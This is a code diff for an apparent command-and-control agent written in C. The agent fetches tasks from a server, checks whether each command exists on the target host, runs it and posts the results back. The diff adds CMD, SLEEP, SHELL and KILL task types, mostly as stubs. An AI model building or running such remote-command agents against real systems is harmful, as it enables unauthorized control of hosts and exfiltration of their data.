@@ -9,9 +9,9 @@
 
 int main(void)
 {
-    struct strings_array sa = { NULL, NULL, 0};
+    struct strings_array sa = { NULL, 0};
     struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}, {'\0'}, false};
-    struct tasks task = { {'\0'}, {'\0'}, {'\0'}, {'\0'}, NULL, 0, 1};
+    struct tasks task = { {'\0'}, 0, {'\0'}, {'\0'}, NULL, NULL, 0, 1};
  
     bool host_info_gathered = false;
     while(!host_info_gathered) {
@@ -65,9 +65,9 @@ int main(void)
 
             // Ref for scanning remainder of string (%[\001-\377]):
             // https://stackoverflow.com/questions/35101996/sscanf-get-the-value-of-the-remaining-string
-            sscanf(task.strings[i], "%s %s %s %[\001-\377]", task.id, task.type, task.cmd, task.args);
+            sscanf(task.strings[i], "%s %d %s %[\001-\377]", task.id, &task.type, task.cmd, task.args);
             printf("Tasks ID: %s\n", task.id);
-            printf("Tasks Type: %s\n", task.type);
+            printf("Tasks Type: %d\n", task.type);
             printf("Tasks Cmd: %s\n", task.cmd);
             printf("Tasks Arg: %s\n", task.args);
             puts(" \n");
@@ -75,32 +75,59 @@ int main(void)
             // specific task. An if block or switch case will be added
             // here to call appropriate functions for a given task type.
 
-            // Check to see if binary exists on target host.
-            if(can_run_cmd(task.cmd)) {
-                puts("Command exists\n");
-                if(run_cmd(&sa, &task)) {
-                    // Eventually will need to include logic if results can't be posted,
-                    // to retain data continuously attempt to re-post until successful.
-                    post_results(&sa);
+            // Designates enum for task types.
+            enum TASK_TYPE {CMD, SLEEP, SHELL, KILL};
+
+            // Begin switch statement against task type to then call follow on
+            // task execution functions.
+            switch (task.type) {
+            case CMD:
+                // error = zerg_msg_parse(file, zhdr);
+                puts("CMD task detected\n");
+                // Check to see if binary exists on target host.
+                if(can_run_cmd(task.cmd)) {
+                    puts("Command exists\n");
+                    if(run_cmd(&task)) {
+                        // Eventually will need to include logic if results can't be posted,
+                        // to retain data continuously attempt to re-post until successful.
+                        post_results(&task);
+                    } else {
+                        printf("Unable to execute command %s\n", task.cmd);
+                        // Will need to include logic to post unsuccessful results.
+                        // Memset task values.
+                        reset_task_vals(&task);
+                        continue;
+                    }
+
                 } else {
-                    printf("Unable to execute command %s\n", task.cmd);
+                    puts("Command does not exist\n");
                     // Will need to include logic to post unsuccessful results.
                     // Memset task values.
-                    memset_task_vals(&task);
+                    reset_task_vals(&task);
                     continue;
                 }
-
-            } else {
-                puts("Command does not exist\n");
-                // Will need to include logic to post unsuccessful results.
-                // Memset task values.
-                memset_task_vals(&task);
+                break;
+            case SLEEP:
+                // error = zerg_status_parse(file, zhdr);
+                puts("SLEEP task detected\n");
+                break;
+            case SHELL:
+                // error = zerg_command_parse(file, zhdr);
+                puts("SHELL task detected\n");
+                break;
+            case KILL:
+                // error = zerg_gps_parse(file, zhdr);
+                puts("KILL task detected\n");
+                break;
+            default:
+                // usage();
+                puts("Invalid task type.\n");
                 continue;
             }
 
             // After executing each task, memset all values to execute
             // next task.
-            memset_task_vals(&task);
+            reset_task_vals(&task);
 
 
         }
@@ -108,7 +135,7 @@ int main(void)
         free(sa.response);
         destroy(&task);
 
-        sa.results = NULL;
+        task.results = NULL;
         sa.response = NULL;
         sa.size = 0;
         task.sz = 0;
